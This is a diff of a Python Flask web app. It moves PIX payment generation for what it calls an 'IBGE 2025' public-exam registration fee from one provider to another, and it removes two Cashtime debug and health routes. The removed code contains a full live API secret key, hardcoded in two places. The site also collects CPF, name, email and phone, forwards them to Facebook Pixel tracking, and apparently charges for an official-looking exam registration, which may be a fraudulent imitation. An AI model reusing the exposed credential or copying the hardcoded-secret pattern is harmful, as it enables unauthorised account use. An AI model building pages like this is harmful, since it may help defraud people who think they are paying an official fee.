@@ -349,84 +349,87 @@ def register_routes(app):
             current_count = PixRequestLimit.get_request_count(cpf_clean)
             print(f"[PIX LIMIT] ✓ Limite OK para CPF {cpf_clean}: {current_count}/8 pedidos")
 
-            print("[PIX DEBUG] Usando API Cashtime como prioridade...")
-            from cashtime_api import CashtimeAPI
+            print("[PIX DEBUG PayBets] Usando PayBets API...")
+            from paybets_api import PayBetsAPI, PaymentRequestData
             from datetime import datetime, timedelta
             import uuid
 
-            print("[PIX DEBUG] Preparando dados do pagamento...")
-            # Valor já vem em centavos do frontend
-            valor_centavos = data['amount'] if isinstance(data['amount'], int) else int(data['amount'] * 100)
-            valor_reais = valor_centavos / 100
+            print("[PIX DEBUG PayBets] Preparando dados do pagamento...")
+            # Converter valor de centavos para reais se necessário
+            valor_reais = data['amount'] / 100 if isinstance(data['amount'], int) else data['amount']
 
-            # Preparar dados para Cashtime API
-            cashtime_data = {
-                'name': data['name'],
-                'email': data['email'],
-                'cpf': data['cpf'],
-                'phone': data.get('phone', '11999999999'),
-                'amount': valor_reais,  # Cashtime espera valor em reais
-                'description': f"Inscrição Concurso Público IBGE 2025 - Valor: R$ {valor_reais:.2f}"
-            }
+            # Preparar dados para PayBets API
+            payment_data = PaymentRequestData(
+                name=data['name'],
+                email=data['email'],
+                cpf=data['cpf'],
+                amount=valor_reais,  # PayBets usa valor em reais
+                phone=data.get('phone', '11999999999'),
+                description=f"Inscrição Concurso Público IBGE 2025 - Valor: R$ {valor_reais:.2f}"
+            )
 
-            print("[PIX DEBUG] Tentando gerar PIX via Cashtime...")
+            print("[PIX DEBUG PayBets] Gerando PIX via PayBets...")
             try:
-                # Criar instância da API Cashtime com a secret key
-                cashtime_secret_key = "sk_live_sLJNf4hOupi7EBe8hVKeRW+AENhDiFhdn0m98dZOHgaNXMBHUwgAnDwEyMSFsaX05oLaDklKbjHe+WMR5wzrcX4AXeux7i8joSG6GB1Nk36BSKyrpuvDdHsXq9JzmAm8XtbaaiUPPmhpnfZNiNk/OGq2tl2CtztLJRVUIWLKhno="
-                cashtime_api = CashtimeAPI(cashtime_secret_key)
+                # Criar instância da API PayBets  
+                api = PayBetsAPI()
                 
-                # Gerar PIX via Cashtime
-                result = cashtime_api.create_pix_payment(cashtime_data)
+                # Gerar PIX
+                response = api.create_pix_payment(payment_data)
 
-                if result.get('success'):
-                    print(f"[PIX DEBUG] ✓ PIX Cashtime gerado com sucesso: {result.get('cashtime_id')}")
+                print(f"[PIX DEBUG PayBets] ✓ PIX PayBets gerado com sucesso: {response.transaction_id}")
 
-                    # Track Facebook Pixel PIX generation
-                    user_info = {
-                        'nome_completo': data['name'],
-                        'email': data['email'],
-                        'cpf': data['cpf'],
-                        'phone': data.get('phone', '')
-                    }
-                    facebook_pixel.track_pix_generation(user_info, result.get('cashtime_id'))
+                # Enviar notificação via Pushcut webhook
+                _send_pushcut_notification(data, {
+                    'transaction_id': response.transaction_id,
+                    'amount': response.amount,
+                    'status': response.status
+                })
 
-                    # Registrar pedido no sistema de limite
-                    try:
-                        ip_address = request.remote_addr
-                        user_agent = request.headers.get('User-Agent', '')
+                # Track Facebook Pixel PIX generation
+                user_info = {
+                    'nome_completo': data['name'],
+                    'email': data['email'],
+                    'cpf': data['cpf'],
+                    'phone': data.get('phone', '')
+                }
+                facebook_pixel.track_pix_generation(user_info, response.transaction_id)
 
-                        PixRequestLimit.add_request(
-                            cpf=data['cpf'],
-                            nome_completo=data['name'],
-                            email=data['email'],
-                            transaction_id=result.get('cashtime_id'),
-                            amount=valor_reais,
-                            ip_address=ip_address,
-                            user_agent=user_agent
-                        )
+                # Registrar pedido no sistema de limite
+                try:
+                    ip_address = request.remote_addr
+                    user_agent = request.headers.get('User-Agent', '')
 
-                        updated_count = PixRequestLimit.get_request_count(cpf_clean)
-                        print(f"[PIX LIMIT] ✓ Pedido registrado - CPF {cpf_clean}: {updated_count}/8 pedidos")
+                    PixRequestLimit.add_request(
+                        cpf=data['cpf'],
+                        nome_completo=data['name'],
+                        email=data['email'],
+                        transaction_id=response.transaction_id,
+                        amount=valor_reais,
+                        ip_address=ip_address,
+                        user_agent=user_agent
+                    )
 
-                    except Exception as e:
-                        print(f"[PIX LIMIT] ⚠ Erro ao registrar pedido: {e}")
+                    updated_count = PixRequestLimit.get_request_count(cpf_clean)
+                    print(f"[PIX LIMIT] ✓ Pedido registrado - CPF {cpf_clean}: {updated_count}/8 pedidos")
 
-                    return jsonify({
-                        'success': True,
-                        'payment_id': result.get('cashtime_id'),
-                        'pix_code': result.get('pix_code'),
-                        'pix_qr_code': result.get('pix_qr_code'),
-                        'expires_at': result.get('expires_at'),
-                        'status': result.get('status', 'pending'),
-                        'cashtime_transaction': True,
-                        'pix_real': True
-                    })
-                else:
-                    raise Exception(result.get('error', 'Erro na API Cashtime'))
+                except Exception as e:
+                    print(f"[PIX LIMIT] ⚠ Erro ao registrar pedido: {e}")
+
+                return jsonify({
+                    'success': True,
+                    'payment_id': response.transaction_id,
+                    'pix_code': response.pix_code,
+                    'pix_qr_code': response.pix_qr_code,
+                    'expires_at': (datetime.now() + timedelta(minutes=30)).isoformat(),
+                    'status': response.status,
+                    'amount': response.amount,
+                    'pix_real': True,
+                    'paybets_transaction': True
+                })
 
             except Exception as api_error:
-                print(f"[PIX DEBUG] ❌ Erro na API Cashtime: {api_error}")
-                print("[PIX DEBUG] Gerando PIX de demonstração como fallback...")
+                print(f"[PIX DEBUG PayBets] ❌ Erro na API PayBets: {api_error}")
+                print("[PIX DEBUG PayBets] Gerando PIX de demonstração como fallback...")
 
                 # PIX de demonstração usando nova implementação
                 import uuid
@@ -616,39 +619,7 @@ def register_routes(app):
             print(f"[PayBets] Erro ao verificar pagamento: {str(e)}")
             return jsonify({'erro': 'Erro ao verificar pagamento'}), 500
 
-    @app.route('/debug-cashtime')
-    def debug_cashtime():
-        """Debug da configuração Cashtime"""
-        import os
-        try:
-            debug_info = {
-                'api_url': 'https://api.cashtime.com.br/v1',
-                'api_configured': True,
-                'available_endpoints': [
-                    '/transactions',
-                    '/transactions/{txid}'
-                ]
-            }
 
-            # Tentar criar instância da API
-            try:
-                from cashtime_api import create_cashtime_api
-                secret_key = "sk_live_sLJNf4hOupi7EBe8hVKeRW+AENhDiFhdn0m98dZOHgaNXMBHUwgAnDwEyMSFsaX05oLaDklKbjHe+WMR5wzrcX4AXeux7i8joSG6GB1Nk36BSKyrpuvDdHsXq9JzmAm8XtbaaiUPPmhpnfZNiNk/OGq2tl2CtztLJRVUIWLKhno="
-
-                api = create_cashtime_api(secret_key=secret_key)
-                debug_info['api_instance_created'] = True
-                debug_info['api_url_active'] = api.API_URL
-                debug_info['secret_key'] = api.secret_key[:20] + '...'
-                debug_info['public_key'] = api.public_key[:20] + '...' if api.public_key else None
-
-            except Exception as e:
-                debug_info['api_instance_created'] = False
-                debug_info['api_error'] = str(e)
-
-            return jsonify(debug_info)
-
-        except Exception as e:
-            return jsonify({'error': str(e)}), 500
 
     @app.route('/debug-paybets')
     def debug_paybets():
@@ -683,28 +654,7 @@ def register_routes(app):
         except Exception as e:
             return jsonify({'error': str(e)}), 500
 
-    @app.route('/health/cashtime')
-    def health_cashtime():
-        """Verificar saúde da API Cashtime"""
-        try:
-            import requests
-            response = requests.get('https://api.cashtime.com.br/health', timeout=5)
 
-            result = {
-                'status': 'healthy' if response.status_code == 200 else 'unhealthy',
-                'api_url': 'https://api.cashtime.com.br/v1',
-                'response_time': response.elapsed.total_seconds(),
-                'status_code': response.status_code
-            }
-
-            status_code = 200 if result['status'] == 'healthy' else 503
-            return jsonify(result), status_code
-        except Exception as e:
-            return jsonify({
-                'status': 'unhealthy',
-                'error': str(e),
-                'api_url': 'https://api.cashtime.com.br/v1'
-            }), 503
 
     @app.route('/health/paybets')
     def health_paybets():
